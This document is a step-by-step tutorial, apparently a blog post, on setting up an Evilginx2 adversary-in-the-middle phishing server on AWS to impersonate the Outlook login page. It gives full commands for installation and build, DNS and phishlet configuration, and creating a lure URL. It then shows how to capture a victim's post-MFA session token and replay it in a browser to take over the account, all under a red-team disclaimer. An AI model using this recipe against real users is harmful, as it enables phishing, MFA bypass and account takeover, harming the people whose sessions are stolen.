
**Author**: Bahtiyar Yusuf  
**Date**: Jan 27, 2024  
**Purpose**: Demonstrate Adversary-in-the-Middle (AiTM) phishing attack using Evilginx2  
**Use Case**: Red team & educational use **only**
https://medium.com/@bahtiyar16/aitm-attack-poc-1289a0f06766
---
## 1. Register a Domain Name

Use any domain registrar to purchase a domain (preferably a cheap TLD):

- [Truehost](https://truehost.com/cloud/)    
- [GoDaddy](https://www.godaddy.com/)
- [IONOS](https://www.ionos.com/)
    

---

## 2. Launch EC2 Ubuntu Server on AWS

1. Sign up for a [Free AWS Account](https://portal.aws.amazon.com/billing/signup#/start/email)
    
2. Go to AWS Console → Search for `EC2`
    
3. Click `Launch Instance`
    
    - Name: `evilginx-lab`
        
    - OS: `Ubuntu 22.04`
        
    - Key Pair: Create new → RSA → `.pem` format
        
4. Configure security group:
    
    - Allow **SSH (22)**, **HTTP (80)**, **HTTPS (443)**, **DNS (53)**
        
5. Launch the instance and note the **Public IP address**
    

---

## 3. Connect to EC2 via SSH

```bash
chmod 400 evilginx.pem
ssh -i "evilginx.pem" ubuntu@<EC2_PUBLIC_IP>
```

---

## 4. Install Evilginx2 on Ubuntu

### Become root

```bash
sudo su -
apt update && apt upgrade -y
```

### Install dependencies

```bash
apt install curl git make -y
```

### Install Golang

```bash
curl -O https://dl.google.com/go/go1.12.7.linux-amd64.tar.gz
tar xvf go1.12.7.linux-amd64.tar.gz
chown -R root:root go
mv go /usr/local
```

### Set Go environment

```bash
echo "export GOPATH=$HOME/work" >> ~/.profile
echo "export PATH=\$PATH:/usr/local/go/bin:\$GOPATH/bin" >> ~/.profile
source ~/.profile
go version
```

---

## 5. Build and Run Evilginx

```bash
git clone https://github.com/BakkerJan/evilginx2.git
cd evilginx2/
make
make install
```

If you see port 53 error:

```bash
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 8.8.8.8" > /etc/resolv.conf
```

Then start Evilginx:

```bash
sudo evilginx
```

---

## 6. Evilginx Configuration

```bash
config domain yourdomain.com
config ip <EC2_PUBLIC_IP>
config redirect_url https://outlook.com
```

Set DNS A records in your registrar for:

- `account.yourdomain.com`
    
- `login.yourdomain.com`
    
- `outlook.yourdomain.com`
    

Point all A records to your EC2 public IP.

---

## 7. Setup and Use Outlook Phishlet

```bash
phishlets hostname outlook yourdomain.com
phishlets enable outlook
lures create outlook
lures edit 0 path mail
```

> Phishing URL: `https://outlook.yourdomain.com/mail`

---

## 8. Capture and Replay Session

1. Victim logs in → MFA prompt → Token captured
    
2. Use command:
    

```bash
sessions
sessions <id>
```

3. Copy token
    
4. Use **Cookie-Editor** browser extension
    
    - Clear cookies
        
    - Import token
        
    - Navigate to `https://outlook.live.com/owa`
        

Boom 💥 — attacker is logged in as victim!

---

## 🔐 Legal Disclaimer

This guide is for **educational and authorized penetration testing purposes only**. Unauthorized access to systems is **illegal** and unethical.

---

## 📎 Reference

- Evilginx2 GitHub: [https://github.com/BakkerJan/evilginx2](https://github.com/BakkerJan/evilginx2)
    
- Bahtiyar Yusuf on [LinkedIn](https://www.linkedin.com/in/bahtiyar-yusuf/)